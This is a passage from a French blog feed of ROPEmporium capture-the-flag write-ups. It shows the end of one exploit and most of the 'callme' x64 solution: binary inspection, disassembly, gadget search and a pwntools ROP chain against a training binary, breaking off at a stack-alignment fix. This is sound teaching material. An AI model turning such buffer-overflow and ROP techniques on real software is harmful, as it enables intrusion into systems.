</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_r14_r15 <span style="color:#f92672">+</span> data_section <span style="color:#f92672">+</span> string 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met la valeur de r15 dans l&#39;endroit vers lequel pointe le contenu de r14 (càd .data)</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> mov_ptr_r14_r15
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met l&#39;adresse de notre string dans rdi puis on appelle la fonction print_file()</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi <span style="color:#f92672">+</span> data_section <span style="color:#f92672">+</span> print_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Puis on peut le tester pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/213875961-819be98f-e699-4a60-8fe7-45caa64e25ac.png" alt="2023-01-21-160402_1111x283_scrot"></p>
<p>Parfait, on a le flag!</p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - callme (x64)</title>
            <link>/posts/2023/01/ropemporium-callme-x64/</link>
            <pubDate>Mon, 02 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-callme-x64/</guid>
            <description>Note Troisième exo de ROPEmporium, un peu plus court que les deux précédents puisqu&amp;rsquo;il reprend des concepts qu&amp;rsquo;on connaît déjà donc pas trop de difficulté. Par contre un petit problème au niveau de la consigne il me semble.
Si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur discord pour me le dire.
Si vous ne comprenez pas quelque chose, je vous invite à regarder la série dans l&amp;rsquo;ordre.</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Troisième exo de ROPEmporium, un peu plus court que les deux précédents puisqu&rsquo;il reprend des concepts qu&rsquo;on connaît déjà donc pas trop de difficulté. Par contre un petit problème au niveau de la consigne il me semble.</p>
<p>Si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="../../../../series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<h2 id="file-information">File information</h2>
<p>Avant de commencer à regarder dans l&rsquo;executable, il faut savoir à quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les éventuelles sécuritées avec lesquelles il a été compilé</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">callme</span> 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">callme</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">e8e49880bdcaeb9012c6de5f8002c72d8827ea4c</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer à un executable en 64bit, linké dynamiquement et qui n&rsquo;est pas strippé
Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">callme</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/callme_x64/callme&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le précédent, <strong>NX</strong> est activé donc pas de shellcode, mais ce n&rsquo;est pas un problème puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation">Exploitation</h2>
<p>Voici la description:</p>
<pre tabindex="0"><code>You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d 
e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. 

For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
</code></pre><p>On peut quand même le lancer et voir ce qu&rsquo;il fait:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548895-0fd03e37-d707-47da-ae38-d1789011bca0.png" alt="2023-01-15-150610_1072x508_scrot"></p>
<p>Comme pour le précédent, on voit qu&rsquo;on peut overflow le buffer en envoyant un nombre conséquent de bytes. Désassemblons le <code>main</code> pour voir plus clairement ce qu&rsquo;il se passe:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400847</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400848</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040084b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20081e</span>]        <span style="color:#75715e"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400852</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:  mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400857</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040085c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400861</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400864</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400730</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400869</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009c8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040086e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400873</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009df</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400878</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040087d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400882</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400898</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400887</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009e7</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040088c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400891</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400896</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:  pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400897</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Comme d&rsquo;habitude, il fait appel à la fonction <code>pwnme</code>, désassemblons-la elle aussi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400898</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400899</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040089c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400700</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009f0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008bb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400a13</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ca</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006e0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008cf</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400710</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400a16</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ea</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:  nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:  leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On voit donc que la fonction <code>read</code> va lire <code>0x200</code> bytes puis les stocker dans un buffer de <code>0x20</code> bytes, ce qui est largement suffisant pour l&rsquo;overflow et faire ce qu&rsquo;on veut.</p>
<p>Maintenant, il nous faut les adresses des trois fonctions callme, pour les trouver, on peut par exemple utiliser <code>pwndbg</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a8</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006d0</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e0</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006f0</span>  callme_three<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400700</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400710</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400720</span>  callme_one<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400730</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400740</span>  callme_two<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400750</span>  exit<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400790</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007a0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400810</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400840</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400847</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400898</span>  pwnme
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004008f2</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400940</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b4</span>  _fini
</span></span></code></pre></div><p>On voit que:</p>
<ul>
<li>callme_one est située à <code>0x00400720</code></li>
<li>callme_two est située à <code>0x00400740</code></li>
<li>callme_three est située à <code>0x004006f0</code></li>
</ul>
<p>Maintenant, il nous faut un gadget qui va pop <code>rdi</code>, <code>rsi</code> et <code>rdx</code> puisque ce sont les registres utilisés pour les 3 premiers arguments
(cf. <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">linux calling convention stack frame</a>)</p>
<p>On va utiliser ROPgadget pour le trouver:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; pop rsi ; pop rdx&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span> : pop rdi ; pop rsi ; pop rdx ; ret
</span></span></code></pre></div><p>On a notre gadget, et on peut totalement l&rsquo;utiliser 3 fois pour chaque fonction, donc pas besoin d&rsquo;en trouver deux autres.</p>
<p>Récapitulons avant de commencer notre exploit:</p>
<ul>
<li>On peut commencer à réecrire la sauvegarde de <code>rip</code> en entrant 40 bytes dans l&rsquo;input</li>
<li>On peut mettre les valeurs qu&rsquo;on veut dans <code>rdi</code>, <code>rsi</code> et <code>rdx</code> grâce à notre gadget</li>
<li>On peut appeller chaque fonction une par une avec les arguments qu&rsquo;on veut</li>
</ul>
<p>Très bien, commençons notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
</span></span></code></pre></div><p>Testons le pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png" alt="2023-01-15-152741_1107x131_scrot"></p>
<p>Et on voit que le programme a <code>segfault</code>&hellip; Pour rappel je suis sous <strong>Ubuntu 22.04</strong> donc mon système est affecté par les problèmes de <em>stack alignment</em>. On va donc ajouter un ret juste après notre padding, qu&rsquo;on peut trouver avec ROPgadget</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Gadgets information
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006be</span> : ret
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">110</span>
